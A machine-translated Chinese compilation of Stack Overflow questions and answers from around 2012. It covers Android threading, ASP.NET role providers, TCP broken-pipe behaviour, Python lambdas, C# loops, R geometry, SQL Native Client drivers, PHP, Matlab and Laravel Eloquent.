Thread delayThread= new Thread(new Runnable()
                {
                    @Override
                    public void run()
                        {
                            try
                {
                    Thread.sleep(1000);
                }
            catch (InterruptedException e)
                {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }

                            activityInstance.this.runOnUiThread(new Runnable()
                                {
                                    @Override
                                    public void run()
                                        {
                                            super.onBackPressed();
                                        }
                                });
                        }
                });
            delayThread.start(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-06T08:13:10.940

最简单的方法是创建一个`Handler`in`onCreate()`并[`postDelayed()`](http://developer.android.com/reference/android/os/Handler.html)与`Runnable`调用的 a 一起使用`super.onBackPressed()`

# c# - 我可以在没有 MembershipProvider 的情况下实现 RoleProvider 吗？

> ID：12264832
> 
> 赞同：0
> 
> 时间：2012-09-04T13:44:51.550
> 
> 标签：c#, asp.net-mvc, asp.net-mvc-3, roleprovider

我正在开发一个带有 Windows 身份验证的 Intranet 应用程序，我已经实现了一个自定义角色提供程序并将其与我的具有用户和角色的存储库绑定。

我`[Authorize(Role="Administrator")]`在我的控制器类上使用。我以“UserA”身份登录，并且已经实现了`GetRolesForUser(string username)`. 此外，“UserA”是“管理员”角色，但授权似乎仍然失败。

我还需要实现 MembershipProvider 吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T14:11:34.753

Windows 身份验证不需要 MembershipProvider。你可以使用任何你想要的 RoleProvider。

检查您的角色提供者的一件事是用户名的存储方式。Windows 身份验证标识是 DOMAIN\UserName。确保您的角色提供者以相同的格式存储用户名。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T14:51:38.553

是的，您绝对可以在没有成员资格提供者的情况下实现角色提供者......

如果您要编写角色提供者，请使用现有的角色提供者代码作为起点或学习练习。从..

[角色提供者工具包示例](http://download.microsoft.com/download/a/b/3/ab3c284b-dc9a-473d-b7e3-33bacfcc8e98/ProviderToolkitSamples.msi.)

# c - 仅在关闭的套接字上的第二次发送时管道损坏

> ID：12264833
> 
> 赞同：7
> 
> 时间：2012-09-04T13:44:52.567
> 
> 标签：c, linux, sockets, client

我正在通过 TCP 套接字测试客户端-服务器通信。我用 C 编写了服务器，并在 Linux 机器上运行它，并`nc`用作测试的客户端。

服务器在与客户端进行初始消息交换后，会定期向客户端发送一些消息而没有得到任何响应。

如果我杀死客户端，我希望`send()`服务器完成的第一次失败并 `EPIPE`出现错误，但这只是在`send()`客户端消失后的第二次出现！我杀死客户端后的第一个`send()`能够成功地将 1100 字节发送到（我想是关闭的）套接字。以下`send()`操作`EPIPE`按预期结束。

有人可以向我解释这种行为吗？是不是因为我写入 TCP/IP 堆栈，所以它可以由堆栈来交付？如果是这样，我如何检查连接状态？确保对等体仍然存在。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-04T15:15:02.620

正常 TCP 连接是四次握手。

[http://en.wikipedia.org/wiki/Transmission_Control_Protocol](http://en.wikipedia.org/wiki/Transmission_Control_Protocol)

当您杀死客户端时，**FIN**段从客户端发送到服务器，服务器协议栈发送**ACK**。

在这里，如果服务器尝试读取数据，read 调用将返回值 0，因此您的服务器程序可以理解对等方已关闭，并且通常会在此之后关闭连接套接字。这将允许发送来自服务器端的**FIN** ，并且在收到来自客户端的最后一个**ACK**​​ 后完成正常的 4 次握手。

（请阅读[http://www.faqs.org/faqs/unix-faq/socket/](http://www.faqs.org/faqs/unix-faq/socket/)的 Q 2.1 ）

但是这里你是从服务器写入数据，所以服务器只有在发送数据后才会从客户端获得一个**RESET 。**因此，在第二次发送的第一次发送操作之后，您会收到错误消息。

所以，请。通过将 linger 选项和超时设置为 0，尝试从客户端**突然**关闭连接，而不是 4 次握手，这样您就可以在服务器端第一次调用 send 时收到错误（可能与 EPIPE 不同）。 （这不是推荐的做法，只是为了您在这种特殊情况下的理解）

```
Try the following option of nc, nc -L 0 to set the linger option and timeout to 0 
```

（我没有尝试过这个 nc 选项，请在此链接[http://docs.oracle.com/cd/E23824_01/html/821-1461/nc-1.html](http://docs.oracle.com/cd/E23824_01/html/821-1461/nc-1.html)中查看详细信息）

来自上述网站的 nc 示例，

```
Connect to TCP port, send some data and terminate the connection with 
TCP RST segment 
(instead of classic TCP closing handshake) by setting the linger option and 
timeout to 0:

$ echo "foo" | nc -L 0 host.example.com 22 
```

# python - lambda和常规函数之间的python有什么区别？

> ID：12264834
> 
> 赞同：45
> 
> 时间：2012-09-04T13:44:55.057
> 
> 标签：python, lambda

我很好奇`lambda`函数和常规函数（用 定义`def`）之间的区别 - 在 python 级别。（我知道程序员有什么区别以及何时使用它们。）

```
>>> def a():
    return 1

>>> b = lambda: 1
>>> a
<function a at 0x0000000004036F98>
>>> b
<function <lambda> at 0x0000000004031588> 
```

正如我们所看到的 - python**知道**这`b`是一个`lambda`函数并且`a`是一个常规函数。这是为什么？**它们与 python**有什么区别？

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2012-09-04T13:47:14.157

它们是相同的类型，因此它们的处理方式相同：

```
>>> type(a)
<type 'function'>
>>> type(b)
<type 'function'> 
```

Python 也知道它`b`被定义为 lambda 函数，并将其设置为函数名称：

```
>>> a.func_name
'a'
>>> b.func_name
'<lambda>' 
```

换句话说，它会影响函数将获得的名称，但就 Python 而言，两者都是函数，这意味着它们大部分可以以相同的方式使用。有关酸洗的函数和 lambda 函数之间的重要区别，请参见下面的 mgilson 评论。

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-09-04T13:50:07.413

唯一的区别是 (a) lambda 的主体只能包含一个表达式，其结果是从创建的函数返回的；(b)`lambda`表达式是计算结果为函数对象的表达式，而`def`语句没有值，并创建一个函数对象并将其绑定到一个名称。

在所有其他材料方面，它们产生相同的对象 - 适用相同的范围和捕获规则。（无关紧要的区别是`lambda`-created 函数的默认`func_name`值为`"<lambda>"`。这可能会影响深奥情况下的操作 - 例如尝试腌制函数。）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2019-12-14T05:14:02.690

首先考虑两者的差异。

**Lambda 函数：** are 运算符可以有任意数量的参数，但它只能有一个表达式。它不能包含任何语句，它返回一个可以分配给任何变量的函数对象。它们可以在创建的块中使用。

**def 函数：**函数有助于将我们的程序分解成更小的和模块化的块。随着我们的程序变得越来越大，功能使其更有条理和更易于管理。它们可以在我们想要的任何地方调用和使用。

在这里，您可以通过以下示例获得更明显的区别。

# 定义一个函数

```
 def add(a,b):
      return a+b
    print(add(4,5)) 
```

# 定义一个 lambda

```
 add = lambda x, y : x + y 
    print(add(4,5)) 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2021-10-12T08:25:13.597

两者都`lambda`创建`def`相同类型的功能——它们具有相同类型的元数据和功能。它们的技术区别在于*语法*：

*   A`lambda`是产生函数的*表达式。*
*   A`def`是产生函数的*语句。*

这就是决定如何*使用*它们的一切。其他明显的差异仅来自信息`lambda`/`def`可以捕获。

```
>>> def def_func(): pass
>>> lambda_func = lambda: None
>>> type(def_func) == type(lambda_func)
True 
```

* * *

##### 用法：表达式与语句

A`lambda`更灵活，因为表达式可以是更多语言结构*的一部分。*

```
#                v--------------v arguments must be expressions
sort(values, key=lambda x: abs(x)) 
```

相比之下，a`def`更强大，因为它可以*包含*更多的语言结构。

```
def encode(num, base):
    while num:   # statements must be inside statements
        num, bit = divmod(num, base)
        yield bit 
```

这些差异直接源于一个是表达式，另一个是语句。Python 没有特殊的规则来决定`lambda`/`def`可以在哪里使用。

* * *

##### 野性`<lambda>`生长的地方

`lambda`假设和`def`对应不同类型函数的主要原因是*元数据*：`lambda`通常被称为“匿名函数”，而且奇迹般地它总是产生一个`function <lambda>`. 其他怪癖包括“无法腌制 lambda 函数”，最近键入也对`lambda`.

这是因为与`def`语法相比，`lambda`语法无法指定名称、类型注释等。因此，Python 只是简单地为任何一个填充了合理的*默认值*：名称变为`<lambda>`，注释为空。

```
>>> identity = lambda a: a
>>> identity.__qualname__
'<lambda>'
>>> identity.__annotations__
{} 
```

由于`<lambda>`不是有效的标识符，因此使用此元数据查找函数的所有操作（最突出的是`pickle`）都会失败。

但是，这并不会使函数成为“匿名函数”类型。可以修补元数据以插入`def`将提供的内容：

```
>>> identity.__qualname__ = identity.__name__ = 'identity'
>>> identity
<function __main__.identity(a)> 
```

当然，在那一点上，人们可以使用`def`……</p>

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-09-04T14:01:23.580

`lambda`创建一个匿名函数。这个想法取自函数式编程语言。通过这种方式，您可以创建函数并将其传递给其他函数，例如`map`和`filter`。（看[这里](http://docs.python.org/release/1.4/tut/node80.html)）
您也可以将普通函数传递给这些函数，但由于它们大多很简单，并且不会在其他任何地方使用，因此定义新函数的整个过程很不方便。

作为一个例子，看看这个：

```
>>> a = [1, 2, 3, 4]
>>> print map( lambda x : x*2 + 1, a )
[3, 5, 7, 9, 11] 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2018-09-10T12:57:46.750

Lambda 是一个内联函数，我们可以在其中执行任何没有函数名称的功能。当我们将它用作高阶函数的参数时，它会很有帮助。例如：一个将其他函数作为参数的函数。

函数定义示例：

```
>>> def func(a, b):
    return a * b

>>> func(2,3)
6
>>> type(func)
<class 'function'>
>>> func
<function func at 0x034B6E88> 
```

Lambda 表达式示例：

```
>>> multiply = lambda a, b: a * b
>>> multiply(2, 3)
6
>>> type(multiply)
<class 'function'>
>>> multiply
<function <lambda> at 0x034B6ED0> 
```

两者都返回相同的输出值。只有返回的对象不同。Function 和 Lambda 的“func”名称。

# web-services - 企业库异常处理和异步回调

> ID：12264836
> 
> 赞同：0
> 
> 时间：2012-09-04T13:45:06.333
> 
> 标签：web-services, asynchronous, exception-handling, callback, enterprise-library

我正在运行一个小型控制台应用程序，它可以异步调用一些 Web 服务。如您所知，这涉及在异步方法完成后调用回调方法。

此应用程序之前进行同步调用并使用 EntLib 5.0 将异常处理策略应用于所有应用程序。调用很简单：

```
 ExceptionManager em = EnterpriseLibraryContainer.Current.GetInstance<ExceptionManager>();
            try
            {
                // Call main work method
            }
            catch (Exception ex)
            {
                em.HandleException(ex, "Main Policy");
                WriteErrorToConsole(ex);
            } 
```

很好，简洁，在一个地方。但现在我有一个异步回调，它不在同一个堆栈中。

为了实现一致的错误处理，我是否需要在我的回调方法中重复这种模式？如果我有多个异步调用和回调方法，我是否必须在每个方法中都这样做，或者是否有某种方法可以将 EntLib 错误处理策略应用于所有方法？

# c# - 如何仅针对循环中的一项跳出循环序列，继续循环其他项？

> ID：12264839
> 
> 赞同：1
> 
> 时间：2012-09-04T13:45:13.820
> 
> 标签：c#, foreach, return, break

我有一个循环（见下文）。如果我输入任何 catch 块，我想结束我正在循环的项目的循环（我有一个文件路径数组）。

说项目是 file = "C:\test.txt"

循环这个文件（C:\test.txt）时，如果出现问题，我想停止这个文件的循环，但继续 foreach 数组 finalFiles 中的其他文件。

这可能吗？

```
foreach (string file in finalFiles)
{
                if (file.Contains(".tiff") == true)
                {
                    PolicyNumber = Path.GetFileName(file).Split('_')[0];
                    basePolicyNumber = PolicyNumber.Remove(PolicyNumber.Length - 2);
                    basePolicyNumber = basePolicyNumber + "00";

                    finalPolicyName = Path.GetFileName(file);

                    try
                    {
                        PolicyUUID = Transporter.GetPolicyUUID(AppVars.pxCentralRootURL, basePolicyNumber);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message, "Error getting UUID from policy online!", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        uploadToPxCentralWorker.ReportProgress(0);
                    }

                    ixLibrarySourceFileURL = AppVars.ixLibraryPolicyAttachmentsURL + finalPolicyName;

                    try
                    {
                        Transporter.UploadFileToixLibrary(AppVars.ixLibraryPolicyAttachmentsURL, file);
                    }
                    catch (Exception ex)
                    {
                        MessageBox.Show(ex.Message);
                        uploadToPxCentralWorker.ReportProgress(0);
                        error = 1;
                    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-04T13:46:35.197

在这些情况下使用“继续”关键字。

使用的 MSDN 链接在[这里。](http://msdn.microsoft.com/en-us/library/923ahwt1%28v=vs.100%29.aspx)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-04T13:46:47.600

试试[continue 关键字](http://msdn.microsoft.com/en-us/library/923ahwt1%28v=vs.71%29.aspx)。它将在下一次迭代中继续循环。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-04T13:47:26.787

您可以使用[`continue keyword`](http://msdn.microsoft.com/en-us/library/923ahwt1%28v=vs.80%29.aspx)：

```
foreach (string file in finalFiles)
{
   if(bad condition)
    continue;
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-04T13:48:52.813

您可以使用 continue 语句。

[继续声明](http://msdn.microsoft.com/en-us/library/923ahwt1%28v=vs.110%29.aspx)

# r - 使用求解/优化基于两点（已知半径）确定圆心

> ID：12264841
> 
> 赞同：8
> 
> 时间：2012-09-04T13:45:23.027
> 
> 标签：r, optimization, geometry

我有一对点，我想找到一个由这两个点确定的已知 r 的圆。我将在模拟和可能的空间中使用它`x`并`y`有边界（比如一个 -200、200 的盒子）。

[已知](http://mathforum.org/library/drmath/view/54490.html)半径的平方为

```
(x-x1)^2 + (y-y1)^2 = r^2
(x-x2)^2 + (y-y2)^2 = r^2 
```

我现在想解决这个非线性方程组以获得两个潜在的圆心。我尝试使用 package `BB`。这是我微弱的尝试，只给出了一点。我想得到的是两个可能的点。任何指向正确方向的指针都将在第一次可能的情况下获得免费啤酒。

```
library(BB)
known.pair <- structure(c(-46.9531139599816, -62.1874917150412, 25.9011462171242, 
16.7441676243879), .Dim = c(2L, 2L), .Dimnames = list(NULL, c("x", 
"y")))

getPoints <- function(ps, r, tr) {
    # get parameters
     x <- ps[1]
     y <- ps[2]

     # known coordinates of two points
     x1 <- tr[1, 1]
     y1 <- tr[1, 2]
     x2 <- tr[2, 1]
     y2 <- tr[2, 2]

     out <- rep(NA, 2)
     out[1] <- (x-x1)^2 + (y-y1)^2 - r^2
     out[2] <- (x-x2)^2 + (y-y2)^2 - r^2
     out
}

slvd <- BBsolve(par = c(0, 0),
                fn = getPoints,
                method = "L-BFGS-B",
                tr = known.pair,
                r = 40
                ) 
```

从图形上看，您可以使用以下代码看到这一点，但您需要一些额外的包。

```
library(sp)
library(rgeos)
plot(0,0, xlim = c(-200, 200), ylim = c(-200, 200), type = "n", asp = 1)
points(known.pair)
found.pt <- SpatialPoints(matrix(slvd$par, nrow = 1))
plot(gBuffer(found.pt, width = 40), add = T) 
```

![在此处输入图像描述](../Images/589c5b4cdd3aa8c188731bd6982c295f.png)

*附录*

谢谢大家的宝贵意见和代码。我为那些用代码称赞他们的答案的发布者提供了答案的时间。

```
 test replications elapsed relative user.self sys.self user.child sys.child
4   alex          100    0.00       NA      0.00        0         NA        NA
2  dason          100    0.01       NA      0.02        0         NA        NA
3   josh          100    0.01       NA      0.02        0         NA        NA
1 roland          100    0.15       NA      0.14        0         NA        NA 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-04T15:04:28.763

以下代码将为您提供两个所需圆的中心的点。现在没有时间对此发表评论或将结果转换为`Spatial*`对象，但这应该会给您一个良好的开端。

首先，这是一个介绍点名称的 ASCII 艺术图。`k`和`K`是已知点，`B`是通过 绘制的水平线上的点`k`，`C1`和`C2`是您所追求的圆的中心：

```
 C2

                            K

                  k----------------------B

                                       C1 
```

现在代码：

```
# Example inputs
r <- 40
known.pair <- structure(c(-46.9531139599816, -62.1874917150412, 
25.9011462171242, 16.7441676243879), .Dim = c(2L, 2L), 
.Dimnames = list(NULL, c("x", "y")))

## Distance and angle (/_KkB) between the two known points
d1 <- sqrt(sum(diff(known.pair)^2))
theta1 <- atan(do.call("/", as.list(rev(diff(known.pair)))))

## Calculate magnitude of /_KkC1 and /_KkC2
theta2 <- acos((d1/2)/r)

## Find center of one circle (using /_BkC1)
dx1 <- cos(theta1 + theta2)*r
dy1 <- sin(theta1 + theta2)*r
p1 <- known.pair[2,] + c(dx1, dy1)

## Find center of other circle (using /_BkC2)
dx2 <- cos(theta1 - theta2)*r
dy2 <- sin(theta1 - theta2)*r
p2 <- known.pair[2,] + c(dx2, dy2)

## Showing that it worked
library(sp)
library(rgeos)
plot(0,0, xlim = c(-200, 200), ylim = c(-200, 200), type = "n", asp = 1)
points(known.pair)
found.pt <- SpatialPoints(matrix(slvd$par, nrow = 1))
points(p1[1], p1[2], col="blue", pch=16)
points(p2[1], p2[2], col="green", pch=16) 
```

![在此处输入图像描述](../Images/07bc9bc5574e71144d32283b377c2718.png)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-04T15:53:33.797

这是其他人都提到的解决它的基本几何方法。我使用 polyroot 来得到二次方程的根，但你可以很容易地直接使用二次方程。

```
# x is a vector containing the two x coordinates
# y is a vector containing the two y coordinates
# R is a scalar for the desired radius
findCenter <- function(x, y, R){
    dy <- diff(y)
    dx <- diff(x)
    # The radius needs to be at least as large as half the distance
    # between the two points of interest
    minrad <- (1/2)*sqrt(dx^2 + dy^2)
    if(R < minrad){
        stop("Specified radius can't be achieved with this data")
    }

    # I used a parametric equation to create the line going through
    # the mean of the two points that is perpendicular to the line
    # connecting the two points
    # 
    # f(k) = ((x1+x2)/2, (y1+y2)/2) + k*(y2-y1, x1-x2)
    # That is the vector equation for our line.  Then we can
    # for any given value of k calculate the radius of the circle
    # since we have the center and a value for a point on the
    # edge of the circle.  Squaring the radius, subtracting R^2,
    # and equating to 0 gives us the value of t to get a circle
    # with the desired radius.  The following are the coefficients
    # we get from doing that
    A <- (dy^2 + dx^2)
    B <- 0
    C <- (1/4)*(dx^2 + dy^2) - R^2

    # We could just solve the quadratic equation but eh... polyroot is good enough
    k <- as.numeric(polyroot(c(C, B, A)))

    # Now we just plug our solution in to get the centers
    # of the circles that meet our specifications
    mn <- c(mean(x), mean(y))
    ans <- rbind(mn + k[1]*c(dy, -dx),
                 mn + k[2]*c(dy, -dx))

    colnames(ans) = c("x", "y")

    ans
}

findCenter(c(-2, 0), c(1, 1), 3) 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-09-04T18:11:46.490

遵循@PhilH 的解决方案，仅在 R 中使用三角函数：

```
radius=40 
```

在半径上画出原点

```
plot(known.pair,xlim=100*c(-1,1),ylim=100*c(-1,1),asp=1,pch=c("a","b"),cex=0.8) 
```

求（也是两个圆心的中点）`c`的中点`ab``de`

```
AB.bisect=known.pair[2,,drop=F]/2+known.pair[1,,drop=F]/2
C=AB.bisect
points(AB.bisect,pch="c",cex=0.5) 
```

找出弦的长度和角度`ab`

```
AB.vector=known.pair[2,,drop=F]-known.pair[1,,drop=F]
AB.len=sqrt(sum(AB.vector^2))
AB.angle=atan2(AB.vector[2],AB.vector[1])
names(AB.angle)<-NULL 
```

`c`计算从到两个圆的中心的直线的长度和角度

```
CD.len=sqrt(diff(c(AB.len/2,radius)^2))
CD.angle=AB.angle-pi/2 
```

计算并绘制两个中心的位置`d`以及`e`从垂线到`ab`长度：

```
center1=C+CD.len*c(x=cos(CD.angle),y=sin(CD.angle))
center2=C-CD.len*c(x=cos(CD.angle),y=sin(CD.angle))
points(center1[1],center1[2],col="blue",cex=0.8,pch="d")
points(center2[1],center2[2],col="blue",cex=0.8,pch="e") 
```

显示：

![在此处输入图像描述](../Images/354fa146b80a2f651e7374153924122b.png)

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-09-04T14:46:44.387

无需数值方程求解。只需公式：

1.  您知道，由于 A 点和 B 点都位于圆上，因此从每个点到给定中心的距离就是半径 r。
2.  以两个已知点的弦为底，第三个点为圆心，形成一个等腰三角形。
3.  将 A 和 B 之间的三角形一分为二，得到一个直角三角形。
4.  [http://mathworld.wolfram.com/IsoscelesTriangle.html](http://mathworld.wolfram.com/IsoscelesTriangle.html)为您提供基长和半径方面的高度。
5.  按照 AB 弦的法线[（请参阅此 SO 答案）](https://stackoverflow.com/q/1243614/429846)，以获取刚刚在每个方向上计算的距该点的高度距离。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-04T14:18:22.547

这是答案的基本内容，如果以后有时间，我会充实它们。如果你跟着文字一起画，这应该很容易理解，对不起，我这台电脑上没有合适的软件为你画图。

撇开点相同（无限解）或相距太远而无法位于所选半径的同一圆上（无解）的退化情况。

标记点`X`和`Y`以及 2 个圆的未知中心点`c1`和`c2`。`c1`并且`c2`位于 的垂直平分线上`XY`；调用这条线`c1c2`，在这个阶段，我们不知道 和 位置的所有细节是无关紧要`c1`的`c2`。

所以，找出线的方程`c1c2`。它通过 的中点`XY`（称为该点`Z`），斜率等于 的负倒数`XY`。现在你有了等式`c1c2`（或者如果这些骨头上有任何肉，你就会得到）。

现在构造从一点到直线与其垂直平分线的交点和圆的中心点的三角形（例如`XZc1`）。您仍然不知道确切的位置`c1`，但这从未阻止任何人绘制几何图形。你有一个直角三角形，它的两条边长已知 (`XZ`和`Xc1`)，所以很容易找到`Zc1`。对另一个三角形和圆心重复该过程。

当然，这种方法与 OP 最初的方法有很大不同，可能没有吸引力。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-09-04T14:22:38.380

一些警告要摆脱，但这应该让你开始。可能存在性能问题，因此使用基本几何完全解决它可能是更好的方法。

```
known.pair <- structure(c(-46.9531139599816, -62.1874917150412, 25.9011462171242, 
                          16.7441676243879), .Dim = c(2L, 2L), .Dimnames = list(NULL, c("x", 
                                                                                        "y")))

findCenter <- function(p,r) {
  yplus <- function(y) {
    ((p[1,1]+sqrt(r^2-(y-p[1,2])^2)-p[2,1])^2+(y-p[2,2])^2-r^2)^2
  }

 yp <- optimize(yplus,interval=c(min(p[,2]-r),max(p[,2]+r)))$minimum
 xp <- p[1,1]+sqrt(r^2-(yp-p[1,2])^2)  
 cp <- c(xp,yp)
 names(cp)<-c("x","y") 

 yminus <- function(y) {
   ((p[1,1]-sqrt(r^2-(y-p[1,2])^2)-p[2,1])^2+(y-p[2,2])^2-r^2)^2
 }

 ym <- optimize(yminus,interval=c(min(p[,2]-r),max(p[,2]+r)))$minimum
 xm <- p[1,1]-sqrt(r^2-(ym-p[1,2])^2)  
 cm <- c(xm,ym)
 names(cm)<-c("x","y")

 list(c1=cp,c2=cm)
}

cent <- findCenter(known.pair,40) 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-09-04T14:31:21.960

我希望你知道一些基本的几何图形，因为不幸的是我不会画它。

垂直平分线是穿过 A 和 B 的圆的每个中点所在的线。

现在你有了 AB 和 r 的中点，所以你可以用点 A、AB 的中点和未知的圆的中点画一个直角三角形。

现在使用毕达哥拉斯定理得到 AB 的中点到圆的中点的距离，从这里开始计算圆的位置应该不难，使用基本的 sin/cos 组合。

# sql - 'SQLNCLI' 提供程序未在本地计算机上注册，sql server 2012

> ID：12264845
> 
> 赞同：10
> 
> 时间：2012-09-04T13:45:39.333
> 
> 标签：sql, sql-server, sqlncli

致力于将应用程序从我的开发箱部署到客户端。在客户端上，当我运行我的 exe 时，我收到错误“'SQLNCLI10' 提供程序未在本地计算机上注册。

我正在 SQL Server 2012 中开发。我尝试在目标机器上安装 sqlncli.msi，但没有成功。

谁能告诉我我需要在客户端机器上安装什么包才能让我的应用程序工作？如果可能的话，请提供该包裹的 URL？

谢谢！

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-09-04T14:05:17.187

发现我需要 2008 版而不是 2012 版。

[http://go.microsoft.com/fwlink/?LinkId=123718&clcid=0x409](http://go.microsoft.com/fwlink/?LinkId=123718&clcid=0x409)

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-09-04T13:48:24.840

您是否在 64 位机器上工作并使用 32 位安装？

这是 64 位链接： http: [//go.microsoft.com/fwlink/ ?LinkID=188401&clcid=0x409](http://go.microsoft.com/fwlink/?LinkID=188401&clcid=0x409)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-09-12T13:58:20.177

使用 SQLNCLI11 连接到 SQLserver 2012

例如：

```
Provider=SQLNCLI11;Data Source=trv6s177;Integrated Security=SSPI;Initial Catalog=DPVCube_Stage 
```

下载

```
http://go.microsoft.com/fwlink/?LinkID=239649&clcid=0x409 
```

X86 包 (sqlncli.msi)

```
http://go.microsoft.com/fwlink/?LinkID=239650&clcid=0x409 
```

X64 包 (sqlncli.msi)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2018-11-21T13:27:23.687

一些更新：

SQLNCLI11 也适用于 windows 10，它可以连接 SQL 2012 和 2014（未在更高版本的 SQL 上测试）这是可用的最新版本

在撰写本文时，可以在此处找到最新的软件包： [https](https://www.microsoft.com/en-us/download/confirmation.aspx?id=50402) ://www.microsoft.com/en-us/download/confirmation.aspx?id= 50402 SQL Server® 2012 Native Client - QFE

来自微软：

不建议使用此驱动进行新开发。新的 OLE DB 提供程序称为 Microsoft OLE DB Driver for SQL Server (MSOLEDBSQL)，它将使用最新的服务器功能进行更新。

文章： [https ://docs.microsoft.com/en-us/sql/relational-databases/native-client/sql-server-native-client?view=sql-server-2017](https://docs.microsoft.com/en-us/sql/relational-databases/native-client/sql-server-native-client?view=sql-server-2017)

下载链接： [https ://docs.microsoft.com/en-us/sql/connect/oledb/oledb-driver-for-sql-server?view=sql-server-2017](https://docs.microsoft.com/en-us/sql/connect/oledb/oledb-driver-for-sql-server?view=sql-server-2017)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2018-10-26T05:36:51.240

在您的机器上安装 sqlncli10 提供程序。

可以从这里下载 SQL 2008 R2 的 sqlncli10 提供程序。

[X86 包。](http://go.microsoft.com/fwlink/?LinkID=188400&clcid=0x409) [X64 封装](http://go.microsoft.com/fwlink/?LinkID=188401&clcid=0x409)

# php - PHP从数组中获取变量值

> ID：12264847
> 
> 赞同：0
> 
> 时间：2012-09-04T13:45:42.127
> 
> 标签：php, arrays

如果我打印一个数组，`$cat`我会得到

```
Array ( [1] => stdClass Object ( [cat_id] => 1 ..
Array ( [2] => stdClass Object ( [cat_id] => 2 .. 
```

但如果我试图得到`cat_id`

```
var_dump($cat->cat_id); 
```

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-04T13:49:29.253

```
foreach($cat AS $singleCat){
   echo $singleCat->cat_id;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-04T13:47:53.137

`$cat`是一个数组。

所以，

```
var_dump($cat[1]->cat_id); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-04T13:48:01.327

尝试`var_dump($cat[0]->cat_id);`

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-04T13:48:19.737

`$cat`是一个数组。您需要先访问包含对象的索引，然后才能访问该对象的属性：

```
var_dump($cat[1]->cat_id); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-04T13:48:26.823

作为`$cat`一个数组，你需要使用索引

```
var_dump($cat[1]->cat_id);//This will work 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-09-04T13:49:38.820

如果你想获得所有`cat_id`...

```
foreach ($cat as $row) {
  echo $row->cat_id;
} 
```

# matlab - 随机交换矩阵的列：Matlab

> ID：12264849
> 
> 赞同：1
> 
> 时间：2012-09-04T13:45:46.057
> 
> 标签：matlab, matrix

认为

```
A = [1 2 3 5 7 9
     6 5 0 3 2 3] 
```

我想随机化矩阵列位置的位置；像这样给`B`：

```
B = [3 9 1 7 2 5
     0 3 6 2 5 3] 
```

我该怎么做这个 Matlab？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-01T07:07:20.493

尝试

```
B = A(randperm(length(A))) 
```

有关说明，请参阅文档。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-05-03T16:20:50.887

您将希望使用该[`randperm`](https://www.mathworks.com/help/matlab/ref/randperm.html)函数生成列索引的随机排列（从 1 到 中的列数`A`），然后您可以使用以下方法对其进行索引`A`：

```
B = A(:, randperm(size(A, 2))); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2017-05-03T16:22:25.303

现在代码格式正确，很明显 OP 希望保留列，尽管[`randperm`](https://uk.mathworks.com/help/matlab/ref/randperm.html)仍然是 HPM 的答案给出的最简单的选项。

```
idx = randperm(size(A,2)); % Create list of integers 1:n, in random order, 
                           % where n = num of columns

B = A(:, idx);             % Shuffles columns about, on all rows, to indixes in idx 
```

# php - 在 Eloquent ORM 中使用 has_many_and_belongs_to 时选择列

> ID：12264851
> 
> 赞同：0
> 
> 时间：2012-09-04T13:45:50.563
> 
> 标签：php, laravel, eloquent

我有三张桌子`places`，，，，`place_user`。`users`我想通过使用方法`users`根据`place_user`Place 模型中的表格列出`has_many_and_belongs_to`。但我不想选择所有用户列。我试图通过以下方式做到：

```
Place::find(1)->users()->get(array('name','email')); 
```

**还有**：

```
Place::find(1)->users()->first(array('name','email')); 
```

但他们没有工作。

处理这个问题的最佳方法是什么？

放置型号：

```
class Place extends Eloquent {
    public static $timestamps = true;

    public function users() {
        return $this->has_many_and_belongs_to('user');
    }
} 
```

**用户型号**：

```
class User extends Eloquent {
    public static $timestamps = true;

    public function get_updated_at_readable() {
        return date('d.m.Y / H:i:s', strtotime($this->get_attribute('updated_at')));
    }

    public function get_created_at_readable() {
        return date('d.m.Y / H:i:s', strtotime($this->get_attribute('updated_at')));
    }

    public function places() {
        return $this->has_many_and_belongs_to('place','place_user');
    }
} 
```

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T21:48:34.413

仍然，不使用 get, first 方法，但 select 方法正在工作：

```
Place::find(1)->users()->select(array('users.name', 'users.email'))->get(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-07T14:21:33.863

